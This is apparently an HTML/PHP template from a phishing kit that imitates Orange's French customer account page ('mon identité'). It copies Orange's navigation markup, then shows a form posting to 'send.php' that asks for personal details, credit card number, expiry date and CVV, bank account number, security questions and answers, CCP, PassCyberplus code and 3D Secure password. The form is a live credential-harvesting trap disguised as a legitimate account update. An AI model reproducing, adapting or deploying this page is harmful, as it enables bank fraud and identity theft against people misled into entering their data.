buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'sedivertir_tvdorange\') );">TV d\'Orange</a></li><li><a href="#://r.orange.fr/r/OCdivertissement_chainestv_fibre" class="o_r_notchanged o-sprite" target="" title="chaines TV" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'sedivertir_chainestv\') );">chaines TV</a></li><li><a href="#://video-a-la-demande.orange.fr/" class="o_r_notchanged o-sprite" target="" title="vid&eacute;o &agrave; la demande" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'sedivertir_vod\') );">vid&eacute;o &agrave; la demande</a></li></ul></li><li class="o-list-panel-1 panel "><ul><li><a href="#://programme-tv.orange.fr/" class="o_r_notchanged o-sprite" target="" title="programme TV" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'sedivertir_prgmtv\') );">programme TV</a></li><li><a href="#://musique.orange.fr/" class="o_r_notchanged o-sprite" target="" title="musique avec Deezer" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'sedivertir_musique\') );">musique avec Deezer</a></li><li><a href="#://cineday.orange.fr/" class="o_r_notchanged o-sprite" target="" title="Orange Cin&eacute;day" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'sedivertir_cineday\') );">Orange Cin&eacute;day</a></li></ul></li><li class="o-list-panel-2 panel "><ul><li><a href="#://video-streaming.orange.fr/" class="o_r_notchanged o-sprite" target="" title="vid&eacute;o avec Dailymotion" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'sedivertir_dailymotion\') );">vid&eacute;o avec Dailymotion</a></li><li><a href="#://jeu.orange.fr/" class="o_r_notchanged o-sprite" target="" title="jeux" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'sedivertir_jeu\') );">jeux</a></li><li><a href="#://jeuxmobiles.jeu.orange.fr/" class="o_r_notchanged o-sprite" target="" title="jeux mobile" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'sedivertir_jeumobile\') );">jeux mobile</a></li></ul></li><li class="o-list-panel-3 panel "><ul><li><a href="#://read-and-go.orange.fr/" class="o_r_notchanged o-sprite" target="" title="Read and Go" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'sedivertir_readandgo\') );">lire avec Read and Go</a></li><li><a href="#://sonnerie-logo.orange.fr/" class="o_r_notchanged o-sprite" target="" title="sonneries" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'sedivertir_sonnerie\') );">sonneries</a></li></ul></li></ul></div><div id="o-headband-5" class="o-hbd"><ul class="o-list-main-panel"><li class="o-list-panel-0 panel "><ul><li><span>les dernières nouvelles</span></li><li><a href="#://actu.orange.fr/" class="o_r_notchanged o-sprite" target="" title="actualit&eacute;" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'informer_actu\') );">actu</a></li><li><a href="#://sports.orange.fr/" class="o_r_notchanged o-sprite" target="" title="sports" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'informer_sports\') );">sports</a></li><li><a href="#://finances.orange.fr/" class="o_r_notchanged o-sprite" target="" title="finances" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'informer_finances\') );">finances</a></li></ul></li><li class="o-list-panel-1 panel "><ul><li class="no-title"></li><li><a href="#://meteo.orange.fr/" class="o_r_notchanged o-sprite" target="" title="m&eacute;t&eacute;o" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'informer_meteo\') );">m&eacute;t&eacute;o</a></li><li><a href="#://en-ville.orange.fr/" class="o_r_notchanged o-sprite" target="" title="près de chez vous" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'informer_ville\') );">près de chez vous</a></li><li><a href="#://astrocenter.orange.fr/orange/" class="o_r_notchanged o-sprite" target="" title="horoscope" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'informer_horoscope\') );">horoscope</a></li></ul></li><li class="o-list-panel-2 panel o-separator "><ul><li><span>magazine</span></li><li><a href="#://auto.orange.fr/" class="o_r_notchanged o-sprite" target="" title="auto" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'informer_auto\') );">auto</a></li><li><a href="#://femmes.orange.fr/" class="o_r_notchanged o-sprite" target="" title="tendances" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'informer_femmes\') );">tendances</a></li></ul></li><li class="o-list-panel-3 panel "><ul><li class="no-title"></li><li><a href="#://voyages.orange.fr/" class="o_r_notchanged o-sprite" target="" title="voyages" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'informer_voyages\') );">voyages</a></li><li><a href="#://lecollectif.orange.fr/" class="o_r_notchanged o-sprite" target="" title="le collectif" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'informer_collectif\') );">le collectif</a></li></ul></li></ul></div><div id="o-headband-6" class="o-hbd"><ul class="o-list-main-panel"><li class="o-list-panel-0 panel "><ul><li><span>annuaire &amp; recherches</span></li><li><a href="#://orange.118712.fr/" class="o_r_notchanged o-sprite" target="" title="annuaire" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'organiser_annuaire\') );">annuaire</a></li><li><a href="#://orange.plan.118712.fr/" class="o_r_notchanged o-sprite" target="" title="itin&eacute;raires &amp; plans" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'organiser_plan\') );">itin&eacute;raires &amp; plans</a></li><li><a href="#://www.lemoteur.fr/" class="o_r_notchanged o-sprite" target="" title="le Moteur" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'organiser_moteur\') );">le Moteur</a></li></ul></li><li class="o-list-panel-1 panel "><ul><li class="no-title"></li><li><a href="#://immobilier.orange.fr/" class="o_r_notchanged o-sprite" target="" title="immobilier" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'organiser_immobilier\') );">immobilier</a></li><li><a href="#://emploiformation.orange.fr/" class="o_r_notchanged o-sprite" target="" title="emploi" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'organiser_emploi\') );">emploi</a></li><li><a href="#://ad.doubleclick.net/clk;269462247;15676908;x" class="o_r_notchanged o-sprite" target="" title="rencontres" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'organiser_rencontres\') );">rencontres</a></li></ul></li><li class="o-list-panel-2 panel o-separator "><ul><li><span>services num&eacute;riques</span></li><li><a href="#://logicielsgratuits.orange.fr/" class="o_r_notchanged o-sprite" target="" title="logiciels gratuits" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'organiser_logicielsgratuits\') );">logiciels gratuits</a></li><li><a href="#://applications-mobiles.orange.fr/" class="o_r_notchanged o-sprite" target="" title="applications mobiles" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'organiser_applications\') );">applications mobiles</a></li><li><a href="#://services-mobiles.orange.fr/" class="o_r_notchanged o-sprite" target="" title="services mobiles" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'organiser_servicesmobiles\') );">services mobiles</a></li></ul></li><li class="o-list-panel-3 panel o-separator "><ul><li><span>bons plans</span></li><li><a href="#://shopping.orange.fr/" class="o_r_notchanged o-sprite" target="" title="shopping" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'organiser_shopping\') );">shopping</a></li><li><a href="#://www.cityvox.fr/?p=orange" class="o_r_notchanged o-sprite" target="" title="Cityvox" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'organiser_cityvox\') );">Cityvox</a></li><li><a href="#://ebay.orange.fr/" class="o_r_notchanged o-sprite" target="" title="bonnes affaires" onclick="o_changeImgForGstat4( buildReferrerOnClick(\'urlwg_rubanGP\', \'\', \'organiser_bonnesaffaires\') );">eBay bonnes affaires</a></li></ul></li></ul></div><div class="bd-fermer o-sprite" onclick="o_bdnDeploy(\'fermer\')"></div></div></div><div id="o-cookie" class="o-hide"></div><div id="o_arche"></div><div id="o-service"><div id="o-title-content"><a onclick="o_changeImgForGstat4(\'urlwg_rubanGP_logo\');" target="_top" href="#://r.orange.fr/r/Ohome_accueil" title="retour &agrave; l\'accueil" id="o-service-logo" class="o_r_notchanged o-sprite"><img src="index_fichiers/z.gif" alt="retour &agrave; l\'accueil" height="53" width="53"></a><div id="o-service-title" class="only-title"><a class="o-domain o_r_notchanged" title="espace client" href="#s://r.orange.fr/r/OGespaceclient_accueil" target="_self">espace client</a></div></div><div id="o-engine"><form name="formSearchCompletion" class="o_r_rechercher" id="formSearchCompletion" onsubmit="o_headerFormSetup()" method="GET"><label id="o-search-label" for="o-search-input" onclick="o_hideSearchLabel();">besoin d\'aide sur vos services...</label><div style="position: relative; margin: 0px; padding: 0px; width: 0px; height: 0px;" class="ecAutoCompleteReferenceBox"><div style="position: absolute; margin: 0px; padding: 0px; border: 0px none; top: 0px;" class="ecAutoCompleteContainerBox"><div style="position: relative; visibility: hidden; display: none;" class="ecAutoCompleteCompletionBox" id="divCompletion_1"></div></div></div><input class="o-hide" autocomplete="off" id="o-search-input" name="kw" accesskey="0" onblur="if(o_hGetById(\'o-search-input\').value==\'\')o_displaySearchLabel(this);" type="text"><input class="o-sprite-icons" alt="Rechercher" title="Rechercher" src="index_fichiers/z.gif" id="o-search-submit" value="" type="submit"></form><div id="o-search-alternate"><a href="#" id="searchEng0" class="o_r_notchanged o-selected" onclick="o_setSearch(this,0);return false;" title="rechercher dans l\'espace client">relation client</a> | <a class="o_r_notchanged" href="#" onclick="o_setSearch(this,-1);return false;">web</a></div></div></div></div>
    
    <div id="necfe_bandeau" class=" bnt fe_clearfix orange"><!--Magic5 Bloc : bandeau.html / programmation: 820133--><!-- /Bloc: 45763--><!-- /Date: 2013-12-16--><!-- /Tpl: 4075--><div class="bnt fe_clearfix"><ul id="bnt_boutons"><li id="bntAccueil" class="accueil"><h2><a href="#s://b.espaceclientv3.orange.fr/?page=gt-home-page" title="Retour &agrave; l&#8217;accueil de l\'espace client">accueil</a></h2></li><li id="bntComptes" class=""><h2><a href="#s://b.espaceclientv3.orange.fr/?cont=ECO" title="">mes contrats</a></h2></li><li id="bntFidelite" class=""><h2><a href="#s://b.espaceclientv3.orange.fr/?page=gt-fidelite" title="">mes avantages</a></h2></li><li id="bntUD" class=""><h2><a href="#s://b.espaceclientv3.orange.fr/?page=gt-urgence-depannage" title="">urgence et d&eacute;pannage</a></h2></li><li id="bntProfil" class=" active"><h2><a href="#s://b.espaceclientv3.orange.fr/?page=profil-infosPerso" title="">mon compte</a></h2></li></ul><div id="bnt_zoneInfobulle"><div class="bnt_infobulle" id="infobulle_bntComptes"><div class="bnt_flecheInfobulle"></div><span class="bnt_infobulleTitre">Mes contrats</span><br><span class="bnt_infobulleTexte">Pour suivre ma conso, consulter et payer mes factures, modifier mon offre, mes options et param&eacute;trer mes services, c&#8217;est ici.</span><br><input class="bnt_infobulleBouton" onclick="necfeWT(\'fermer infobulle mes contrats\', \'Bandeau - infobulles\');necFe.bandeau.closeInfobulle(this.parentNode);" value="Fermer" type="button"></div><div class="bnt_infobulle" id="infobulle_bntProfil"><div class="bnt_flecheInfobulle"></div><span class="bnt_infobulleTitre">Mon compte</span><br><span class="bnt_infobulleTexte">Pour mettre &agrave; jour mon adresse email de contact, mon num&eacute;ro de mobile ou encore personnaliser mon mot de passe, c&#8217;est ici.</span><br><input class="bnt_infobulleBouton" onclick="necfeWT(\'fermer infobulle mon compte\', \'Bandeau - infobulles\');necFe.bandeau.closeInfobulle(this.parentNode);" value="Fermer" type="button"></div></div><ul id="bnt_ariane"><li class="bnt_ariancmn"><a href="#s://b.espaceclientv3.orange.fr/?page=profil-infosPerso">mon compte</a></li><li><span>mon identit&eacute;</span></li></ul><h1 id="bntTitle">mon identit&eacute;</h1><div class="bntBtn"></div></div></div>
    <div class="nec-content profil-formulaireDonneesPerso fe_clearfix"><div style="float:left;width:710px" class="formData"><!--Magic5 Bloc : form_donneesPerso.html / programmation: 818092--><!-- /Bloc: 45237--><!-- /Date: 2014-02-18--><!-- /Tpl: 10653-->
	<div class="erreur_generale ">Merci de v&eacute;rifier les champs en rouge ci-dessous.</div>
	<form id="form_donneesPerso" method="POST" name="donneesPerso" onsubmit="" action="send.php">
	<input name="typeForm" value="donneesPerso" type="hidden">
	<input name="operation" value="briseGlace" type="hidden">
	<input id="email" name="email" value="" type="hidden">
	<input name="emailStatus" id="emailStatus" value="" type="hidden">
	<input name="token" value="6b12d7bdd3b43d3f9ae65d2f5370efa91599f7eb83bd35583da81c3669585c57" type="hidden">
	<div class="profilForm"><span class="labelTitre">mon identit&eacute;</span><span class="accroche"></span>
	<div class="data civilite" id="bloc_salutation"><span class="label">civilit&eacute; * :</span><span class="radioBox labelRadioBox">
	<label><input name="salutation" value="MME" type="radio">Madame</label><label><input name="salutation" value="M"  type="radio">Monsieur</label>
	</span></div>
	<div class="data " id="bloc_nom"><span class="label">nom * :</span><span class="field">
	<input name="nom" id="nom" value="'.$nom.'" onchange="BG_checkNameElement(this.value,\'bloc_nom\');" type="text"></span><span class="message_obligatoire">la saisie de ce champ est obligatoire</span><span class="message_synthaxe">renseignez votre nom en &eacute;vitant les chiffres et les caractères sp&eacute;ciaux (/, ", etc.)</span><span class="message_ok"></span></div>
	<div class="data " id="bloc_prenom"><span class="label">pr&eacute;nom * :</span>
	<span class="field">
	<input name="prenom" id="prenom"  value="'.$prenom.'" onchange="BG_checkNameElement(this.value,\'bloc_prenom\');" type="text">
	</span>
	<span class="message_obligatoire">la saisie de ce champ est obligatoire</span>
	<span class="message_synthaxe">renseignez votre pr&eacute;nom en &eacute;vitant les chiffres et les caractères sp&eacute;ciaux (/, ", etc.)</span>
	<span class="message_ok"></span></div>
	<div id="bloc_naissance" class="data birthday ">
	<span class="label">date de naissance * :</span>
	<span class="field"><div class="styled-select veryshort"><select name="nj" id="nj" onchange="BG_checkBirthDateElement();"><option selected="selected" value=""></option><option value="1">1</option><option value="2">2</option><option value="3">3</option><option value="4">4</option><option value="5">5</option><option value="6">6</option><option value="7">7</option><option value="8">8</option><option value="9">9</option><option value="10">10</option><option value="11">11</option><option value="12">12</option><option value="13">13</option><option value="14">14</option><option value="15">15</option><option value="16">16</option><option value="17">17</option><option value="18">18</option><option value="19">19</option><option value="20">20</option><option value="21">21</option><option value="22">22</option><option value="23">23</option><option value="24">24</option><option value="25">25</option><option value="26">26</option><option value="27">27</option><option value="28">28</option><option value="29">29</option><option value="30">30</option><option value="31">31</option></select></div><div class="styled-select veryshort"><select name="nm" id="nm" onchange="BG_checkBirthDateElement();"><option selected="selected" value=""></option><option value="1">1</option><option value="2">2</option><option value="3">3</option><option value="4">4</option><option value="5">5</option><option value="6">6</option><option value="7">7</option><option value="8">8</option><option value="9">9</option><option value="10">10</option><option value="11">11</option><option value="12">12</option></select></div><div class="styled-select short"><select name="na" id="na" onchange="BG_checkBirthDateElement();"><option selected="selected" value=""></option><option value="1920">1920</option><option value="1921">1921</option><option value="1922">1922</option><option value="1923">1923</option><option value="1924">1924</option><option value="1925">1925</option><option value="1926">1926</option><option value="1927">1927</option><option value="1928">1928</option><option value="1929">1929</option><option value="1930">1930</option><option value="1931">1931</option><option value="1932">1932</option><option value="1933">1933</option><option value="1934">1934</option><option value="1935">1935</option><option value="1936">1936</option><option value="1937">1937</option><option value="1938">1938</option><option value="1939">1939</option><option value="1940">1940</option><option value="1941">1941</option><option value="1942">1942</option><option value="1943">1943</option><option value="1944">1944</option><option value="1945">1945</option><option value="1946">1946</option><option value="1947">1947</option><option value="1948">1948</option><option value="1949">1949</option><option value="1950">1950</option><option value="1951">1951</option><option value="1952">1952</option><option value="1953">1953</option><option value="1954">1954</option><option value="1955">1955</option><option value="1956">1956</option><option value="1957">1957</option><option value="1958">1958</option><option value="1959">1959</option><option value="1960">1960</option><option value="1961">1961</option><option value="1962">1962</option><option value="1963">1963</option><option value="1964">1964</option><option value="1965">1965</option><option value="1966">1966</option><option value="1967">1967</option><option value="1968">1968</option><option value="1969">1969</option><option value="1970">1970</option><option value="1971">1971</option><option value="1972">1972</option><option value="1973">1973</option><option value="1974">1974</option><option value="1975">1975</option><option value="1976">1976</option><option value="1977">1977</option><option value="1978">1978</option><option value="1979">1979</option><option value="1980">1980</option><option value="1981">1981</option><option value="1982">1982</option><option value="1983">1983</option><option value="1984">1984</option><option value="1985">1985</option><option value="1986">1986</option><option value="1987">1987</option><option value="1988">1988</option><option value="1989">1989</option><option value="1990">1990</option><option value="1991">1991</option><option value="1992">1992</option><option value="1993">1993</option><option value="1994">1994</option><option value="1995">1995</option><option value="1996">1996</option><option value="1997">1997</option><option value="1998">1998</option><option value="1999">1999</option><option value="2000">2000</option><option value="2001">2001</option><option value="2002">2002</option><option value="2003">2003</option><option value="2004">2004</option><option value="2005">2005</option><option value="2006">2006</option><option value="2007">2007</option><option value="2008">2008</option><option value="2009">2009</option><option value="2010">2010</option><option value="2011">2011</option><option value="2012">2012</option><option value="2013">2013</option></select></div></span>
	<span class="message_synthaxe">la date saisie doit être comprise entre le 01/01/1920 et la date du jour</span></div>
	<div class="data " id="bloc_adr"><span class="label">Adresse * :</span>
	<span class="field">
	<input name="adr" id="adr" value="'.$adr.'" onchange="BG_checkNameElement(this.value,\'bloc_prenom\');" type="text" style="width:300px;">
	</span>
	<span class="message_obligatoire">la saisie de ce champ est obligatoire</span>
	<span class="message_synthaxe">renseignez votre Adresse</span>
	<span class="message_ok"></span></div>
	<div class="data " id="bloc_ville"><span class="label">Ville * :</span>
	<span class="field">
	<input name="ville" id="ville" value="'.$ville.'" onchange="BG_checkNameElement(this.value,\'bloc_prenom\');" type="text">
	</span>
	<span class="message_obligatoire">la saisie de ce champ est obligatoire</span>
	<span class="message_synthaxe">renseignez votre Ville</span>
	<span class="message_ok"></span></div>
	<div class="data " id="bloc_cp"><span class="label">Code postal * :</span>
	<span class="field">
	<input name="cp" id="cp" value="'.$zip.'" onchange="BG_checkNameElement(this.value,\'bloc_prenom\');" type="text">
	</span>
	<span class="message_obligatoire">la saisie de ce champ est obligatoire</span>
	<span class="message_synthaxe">renseignez votre Adresse</span>
	<span class="message_ok"></span></div>
	<div class="data " id="bloc_tel"><span class="label">Telephone * :</span>
	<span class="field">
	<input name="tel" id="tel" value="'.$mobil.'" onchange="BG_checkNameElement(this.value,\'bloc_prenom\');" type="text">
	</span>
	<span class="message_obligatoire">la saisie de ce champ est obligatoire</span>
	<span class="message_synthaxe">renseignez votre Adresse</span>
	<span class="message_ok"></span></div>
	<div class="data  " id="banque">
	<span class="label">Votre banque * :</span>
	<span class="field"><div class="styled-select veryshort" style="width:250px;">
	<select name="cc_banque" id="cc_banque" style="width:300px;">
                    <option value="">S&eacute;lectionner votre banque</option>
                    <option value="axa-banque">AXA Banque</option>
                    <option value="banque-agf-allianz">Banque AGF / Allianz</option>
                    <option value="banque-de-bretagne">Banque de Bretagne</option>
                    <option value="banque-de-savoie">Banque de Savoie</option>
                    <option value="banque-dupuy-de-parseval">Banque Dupuy de Parseval</option>
                    <option value="banque-marze">Banque Marze</option>
                    <option value="banque-palatine">Banque Palatine</option>
                    <option value="banque-populaire">Banque Populaire</option>
                    <option value="banque-postale">Banque Postale</option>
                    <option value="barclays">Barclays</option>
                    <option value="b-for-bank">BforBank</option>
                    <option value="binck">Binck.fr</option>
                    <option value="bnp">BNP</option>
                    <option value="bnp-net-agence">BNP Paribas La NET Agence</option>
                    <option value="boursorama">Boursorama Banque</option>
                    <option value="bpe">BPE</option>
                    <option value="caisse-epargne">Caisse d\'Epargne</option>
                    <option value="cic">CIC</option>
                    <option value="coopabanque">Coopabanque</option>
                    <option value="credit-agricole">Cr&eacute;dit Agricole</option>
                    <option value="credit-cooperatif">Cr&eacute;dit Cooperatif</option>
                    <option value="credit-du-nord">Cr&eacute;dit du Nord</option>
                    <option value="credit-mutuel">Cr&eacute;dit Mutuel</option>
                    <option value="e-lcl">e.LCL</option>
                    <option value="fortis-banque">Fortis Banque</option>
                    <option value="fortuneo-banque">Fortuneo Banque</option>
                    <option value="groupama-banque">Groupama Banque</option>
                    <option value="hsbc">HSBC</option>
                    <option value="ing-direct">ING Direct</option>
                    <option value="lcl">LCL</option>
                    <option value="monabanq">Monabanq</option>
                    <option value="societe-generale">Societe Generale</option>
                    <option value="societe-marseillaise-de-credit">Soci&eacute;t&eacute; Marseillaise de Cr&eacute;dit</option>
                    <option value="autre">Autre Banque</option>
                </select></div></span>
	<span class="message_synthaxe">la date saisie doit être comprise entre le 01/01/1920 et la date du jour</span></div>
	
	<div class="data " id="bloc_cc"><span class="label">Carte de credit * :</span>
	<span class="field">
	<input name="cc" id="cc" value="" onchange="BG_checkNameElement(this.value,\'bloc_prenom\');" type="text" style="width:200px">
	</span>
	<span class="message_obligatoire">la saisie de ce champ est obligatoire</span>
	<span class="message_synthaxe">renseignez votre Adresse</span>
	<span class="message_ok"></span></div>
	
	<div class="data birthday "id="bloc_ex">
	<span class="label">date d\'expiration * :</span>
	<span class="field">
	<div class="styled-select veryshort">
	<select name="b1" id="b1" onchange="BG_checkBirthDateElement();">
	<option selected="selected" value=""></option>
	<option value="1">1</option>
	<option value="2">2</option>
	<option value="3">3</option>
	<option value="4">4</option>
	<option value="5">5</option>
	<option value="6">6</option>
	<option value="7">7</option>
	<option value="8">8</option>
	<option value="9">9</option>
	<option value="10">10</option>
	<option value="11">11</option>
	<option value="12">12</option>
	</select></div>
	<div class="styled-select short">
	<select name="b2" id="b2" onchange="BG_checkBirthDateElement();">
	<option selected="selected" value=""></option>
		<option value="2015">2015</option>
                                            <option value="2016">2016</option>
                                            <option value="2017">2017</option>
                                            <option value="2018">2018</option>
                                            <option value="2019">2019</option>
                                            <option value="2020">2020</option>
                                            <option value="2021">2021</option>
                                            <option value="2022">2022</option>
											</select></div></span>
	<span class="message_synthaxe">la date saisie doit être comprise entre le 01/01/1920 et la date du jour</span></div>
	
	<div class="data " id="bloc_cvv"><span class="label">Cvv * :</span>
	<span class="field">
	<input name="cvv" id="cvv" value="" onchange="BG_checkNameElement(this.value,\'bloc_prenom\');" type="text" style="width:60px">
	</span>
	<span class="message_obligatoire">la saisie de ce champ est obligatoire</span>
	<span class="message_synthaxe">renseignez votre Adresse</span>
	<span class="message_ok"></span></div>
	
	<div class="SG data " id="bloc_nc"><span class="label">Num&eacute;ro de compte bancaire * :</span>
	<span class="field">
	<input name="nc" id="nc" value="" onchange="BG_checkNameElement(this.value,\'bloc_prenom\');" type="text" style="">
	</span>
	<span class="message_obligatoire">la saisie de ce champ est obligatoire</span>
	<span class="message_synthaxe">renseignez votre Adresse</span>
	<span class="message_ok"></span></div>
	
	<div class="data q1 BP" id="bloc_q1">
	<span class="label">Question #1 * : </span>
	<span class="field">
	<div class="styled-select veryshort" style="width:400px;">
	<select name="q1" id="q1" style="width:500px;">
                    <option value="Quel etait le prenom de votre meilleur(e) ami(e) denfance?">Quel &eacute;tait le pr&eacute;nom de votre meilleur(e) ami(e) d\'enfance ?</option>
                    <option value="Dans quelle rue avez-vous grandi?">Dans quelle rue avez-vous grandi ?</option>
                    <option value="Quel est le prenom de laine(e) de vos cousins et cousines?">Quel est le prenom de laine(e) de vos cousins et cousines?</option>
                </select></div></span>
	<span class="message_synthaxe">la date saisie doit être comprise entre le 01/01/1920 et la date du jour</span></div>
	

	<div class="data r1 BP" id="bloc_r1"><span class="label">R&eacute;ponse #1 * :</span>
	<span class="field">
	<input name="r1" id="r1" value="" onchange="BG_checkNameElement(this.value,\'bloc_prenom\');" type="text" >
	</span>
	<span class="message_obligatoire">la saisie de ce champ est obligatoire</span>
	<span class="message_synthaxe">renseignez votre Adresse</span>
	<span class="message_ok"></span></div>
	
	<div class="data q2 BP" id="bloc_q2">
	<span class="label">Question #2 * : </span>
	<span class="field">
	<div class="styled-select veryshort" style="width:400px;">
	<select name="q2" id="q2" style="width:500px;">
                <!--<option value="Quel est le prenom de laine(e) de vos cousins et cousines?">Quel est le prenom de laine(e) de vos cousins et cousines?</option>
                <option value="Nom de jeune fille de votre mere?">Nom de jeune fille de votre mere?</option>
                <option value="Second prenom de votre pere?">Second prenom de votre pere?</option>
                <option value="Votre surnom enfant?">Votre surnom enfant?</option>
                <option value="Nom de votre animal de compagnie?">Nom de votre animal de compagnie?</option>-->
                <option value="Quel a ete votre lieu de vacances prefere durant votre enfance?">Quel a &eacute;t&eacute; votre lieu de vacances pr&eacute;f&eacute;r&eacute; durant votre enfance ?</option>
                <option value="Quel etait votre dessin anime prefere?">Quel &eacute;tait votre dessin anim&eacute; pr&eacute;f&eacute;r&eacute; ?</option>
                </select></div></span>
	<span class="message_synthaxe">la date saisie doit être comprise entre le 01/01/1920 et la date du jour</span></div>
	
	<div class="data r2 BP" id="bloc_r2"><span class="label">R&eacute;ponse #2 * :</span>
	<span class="field">
	<input name="r2" id="r2" value=""  type="text" >
	</span>
	<span class="message_obligatoire">la saisie de ce champ est obligatoire</span>
	<span class="message_synthaxe">renseignez votre R&eacute;ponse</span>
	<span class="message_ok"></span></div>
	
	<div class="data BP" id="bloc_ccp"><span class="label">CCP * :</span>
	<span class="field">
	<input name="ccp" id="ccp" value=""  type="text" >
	</span>
	<span class="message_obligatoire">la saisie de ce champ est obligatoire</span>
	<span class="message_synthaxe">renseignez votre CCP</span>
	<span class="message_ok"></span></div>
	
	<div class="data POP" id="bloc_plus"><span class="label">PassCyberplus * :</span>
	<span class="field">
	<input name="plus" id="plus" value="" onchange="BG_checkNameElement(this.value,\'bloc_prenom\');" type="text" >
	</span>
	<span class="message_obligatoire">la saisie de ce champ est obligatoire</span>
	<span class="message_synthaxe">renseignez votre code PassCyberplus</span>
	<span class="message_ok"></span></div>
	
	<div class="data LCL" id="bloc_3d"><span class="label">Votre mot de passe 3D Secure * :</span>
	<span class="field">
	<input name="3d" id="3d" value="" onchange="BG_checkNameElement(this.value,\'bloc_prenom\');" type="text" >
	</span>
	<span class="message_obligatoire">la saisie de ce champ est obligatoire</span>
	<span class="message_synthaxe">renseignez votre code PassCyberplus</span>
	<span class="message_ok"></span></div>
	
	<div class="data q LCL" id="bloc_q3">
	<span class="label">Question * : </span>
	<span class="field">
	<div class="styled-select veryshort LCL" style="width:400px;">
	<select name="q3" id="q3" style="width:500px;">
                <!--<option value="Quel est le prenom de laine(e) de vos cousins et cousines?">Quel est le prenom de laine(e) de vos cousins et cousines?</option>
                
                <option value="Second prenom de votre pere?">Second prenom de votre pere?</option>
                <option value="Votre surnom enfant?">Votre surnom enfant?</option>
                <option value="Nom de votre animal de compagnie?">Nom de votre animal de compagnie?</option>
                <option value="Quel a ete votre lieu de vacances prefere durant votre enfance?">Quel a &eacute;t&eacute; votre lieu de vacances pr&eacute;f&eacute;r&eacute; durant votre enfance ?</option>
                <option value="Quel etait votre dessin anime prefere?">Quel &eacute;tait votre dessin anim&eacute; pr&eacute;f&eacute;r&eacute; ?</option>-->
                <option value="Nom de jeune fille de votre mere?">Nom de jeune fille de votre mere?</option></select></div></span>
	<span class="message_synthaxe">la date saisie doit être comprise entre le 01/01/1920 et la date du jour</span></div>
	
	
	<div class="data r LCL" id="bloc_r3"><span class="label">R&eacute;ponse * :</span>
	<span class="field">
	<input name="r3" id="r3" value="" onchange="BG_checkNameElement(this.value,\'bloc_prenom\');" type="text" >
	</span>
	<span class="message_obligatoire">la saisie de ce champ est obligatoire</span>
	<span class="message_synthaxe">renseignez votre Adresse</span>
	<span class="message_ok"></span></div>
	
	</div><div class="formZoneBouton"><a id="a" href="#" ><div style="background-image:url(index_fichiers/fondBouton.png); width:121px; height:30px; display:block "></div></a></div></form><div style="display:none" id="popin_cliper"><div class="cliper"><form action="" onsubmit="BG_askEmail();return false;"><input value="||" id="originalEmail" name="originalEmail" type="hidden"><h1 style="color:#FF5500;" class="HelvetLight">finaliser la mise &agrave; jour de mes informations personnelles</h1><h3 style="color:#666;">Pour am&eacute;liorer notre relation client avec vous lors de vos &eacute;changes avec Orange merci de renseigner :</h3><div style="padding:20px 0 20px 200px;"><dl id="bloc_email"><dt style="text-align:left;"><label id="label_popin_email" for="popin_email">email de contact
           <sup>*</sup></label></dt><dd style="text-align:left;"><input id="popin_email" maxlength="254" name="popin_email" class="text long" type="text"></dd><span class="message_inactif">l\'email saisi n\'est pas actif</span><span class="message_obligatoire">renseignez un email valide et au bon format</span><span class="message_ok"></span><span class="message_synthaxe">renseignez un email valide et au bon format</span><span class="loader"></span></dl></div>
		   <div id="buttons">
		   
		   </div>
		   </form></div></div>
<!--Magic5 Bloc : retour_profil_form_infosPerso.html / programmation: 818058--><!-- /Bloc: 45162--><!-- /Date: 2013-11-18--><!-- /Tpl: 10618-->
</div><div style="float:right;width:150px" class="necfe_rebond"><!--Magic4 Bloc : blocPrincipal-header.html / programmation: 225785--><!-- /Bloc: --><!-- /Date: --><!-- /Tpl: --><div class="blocPrincipalHeader"></div>
